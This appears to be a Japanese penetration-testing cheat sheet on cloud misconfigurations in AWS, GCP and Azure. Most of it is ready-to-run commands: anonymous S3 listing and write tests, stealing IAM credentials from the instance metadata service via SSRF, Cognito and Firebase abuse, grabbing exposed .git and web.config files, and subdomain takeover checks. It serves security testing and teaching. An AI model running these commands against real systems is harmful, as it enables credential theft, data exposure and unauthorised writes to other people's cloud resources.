Cloud Misconfiguration

AWS, GCP, Azure -- クラウドサービスの設定ミスは攻撃者にとって最も低コストで 高インパクトな attack surface。

Theory Practice

AWS Misconfiguration

S3 Bucket Enumeration & Misconfigured ACLs

# Bucket 名の推測
# パターン: {company}-{env}, {company}-{service}, {company}-backup
aws s3 ls s3://target-dev --no-sign-request
aws s3 ls s3://target-staging --no-sign-request
aws s3 ls s3://target-backup --no-sign-request

# S3Scanner で自動列挙
s3scanner scan --bucket-file bucket_names.txt

# ACL チェック
aws s3api get-bucket-acl --bucket target-bucket --no-sign-request
# "AllUsers" に READ/WRITE が付いていたら misconfiguration

# オブジェクト一覧
aws s3 ls s3://target-bucket/ --no-sign-request --recursive

# 書き込みテスト (許可されている場合のみ)
echo "test" > /tmp/test.txt
aws s3 cp /tmp/test.txt s3://target-bucket/test.txt --no-sign-request

EC2 Metadata Service (IMDS)

# IMDSv1 (SSRF で狙われる)
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# IMDSv2 (Token 必要 - SSRF での悪用が困難)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/

# SSRF 経由で IMDSv1 にアクセスできれば IAM credentials が取得可能
# → AWS アカウント内の他リソースへの lateral movement

Lambda Function URL Exposure

# Lambda Function URL は認証なしで公開される場合がある
# パターン: https://{id}.lambda-url.{region}.on.aws/
# Content Discovery で発見、または DNS record から

# Cognito Misconfiguration
# Identity Pool が unauthenticated access を許可
aws cognito-identity get-id --identity-pool-id {region}:{pool-id}
aws cognito-identity get-credentials-for-identity --identity-id {id}
# → Temporary AWS credentials が取得できる

GCP Misconfiguration

Firebase Rules (Open Read/Write)

# Firebase Realtime Database
curl https://TARGET.firebaseio.com/.json
# データベース全体が読める場合 = misconfiguration

# 書き込みテスト
curl -X PUT https://TARGET.firebaseio.com/test.json \
  -d '{"hacked":"true"}'

# Firestore rules チェック
# /.well-known/firebase/rules.json (公開されていることがある)

# firebase-enum で自動チェック
python3 firebase-enum.py -p TARGET

Cloud Storage Bucket

# GCS bucket listing
curl https://storage.googleapis.com/TARGET-bucket/
curl https://storage.googleapis.com/storage/v1/b/TARGET-bucket/o

# gsutil (認証なし)
gsutil ls gs://target-bucket/
gsutil cp gs://target-bucket/sensitive-file.txt ./

Cloud Function Invocation

# 認証なしで呼び出せる Cloud Function
curl https://{region}-{project}.cloudfunctions.net/{function-name}

# allUsers に invoker 権限が付いている場合
# → 意図しない内部機能が外部から実行可能

Azure Misconfiguration

Blob Storage Enumeration

# Azure Blob Storage listing
curl "https://TARGET.blob.core.windows.net/CONTAINER?restype=container&comp=list"

# パブリックアクセスレベル
# Container: 全 blob が匿名アクセス可能
# Blob: URL を知っていれば匿名アクセス可能

# cloud_enum で自動列挙
python3 cloud_enum.py -k target

App Service Source Code Exposure

# .git 露出
curl https://target.azurewebsites.net/.git/config

# Kudu (SCM) サイト
curl https://target.scm.azurewebsites.net/

# Web deploy backup
curl https://target.azurewebsites.net/web.config

Subdomain Takeover via Cloud Services

Cloud サービスを指す DNS レコードが残ったまま、サービスが削除された場合に 攻撃者が claim できる。

Service CNAME Pattern Takeover Signal
AWS S3 *.s3.amazonaws.com NoSuchBucket
Azure *.azurewebsites.net 404 + default page
Heroku *.herokuapp.com No such app
GitHub Pages *.github.io 404 There isn't a GitHub Pages site here
Fastly *.fastly-edge.com Fastly error: unknown domain
Shopify *.myshopify.com Sorry, this shop is currently unavailable
Fastly Takeover の False Positive に注意

CNAME が *.fastly-edge.com を指していても、それだけでは takeover 可能とは限らない。 vulnerable subdomain 自身に curl して "unknown domain" が返るかを確認する必要がある。 CNAME 先が存在するのにドメインがそのサービスに登録されていない、というケースのみ takeover が成立する。 

# 検出ツール
# nuclei takeover templates
cat subdomains.txt | nuclei -t takeovers/

# can-i-take-over-xyz の fingerprint で手動確認
dig CNAME target-sub.target.com
curl -I target-sub.target.com
# レスポンスの fingerprint を can-i-take-over-xyz と照合

Tools Summary

  • cloud_enum — マルチクラウド対応のリソース列挙 (S3, GCS, Azure Blob)
  • S3Scanner — S3 bucket の permissions チェック特化
  • firebase-enum — Firebase project の misconfiguration スキャン
  • ScoutSuite — AWS/GCP/Azure の包括的な security audit
  • Prowler — AWS security best practices チェック
  • nuclei — takeover / exposure テンプレート

Key Takeaways

  • S3 bucket は最も一般的な misconfiguration — 名前を推測して --no-sign-request で試す
  • IMDSv1 + SSRF = 完全なアカウント侵害 — SSRF を見つけたら必ず IMDS を試す
  • Firebase の open rules は致命的 — .json エンドポイントで全データ読み出し
  • Subdomain takeover は Cloud service 経由が最多 — dangling CNAME を継続監視
  • False positive に注意 — takeover を主張する前に実際に claim 可能か確認する
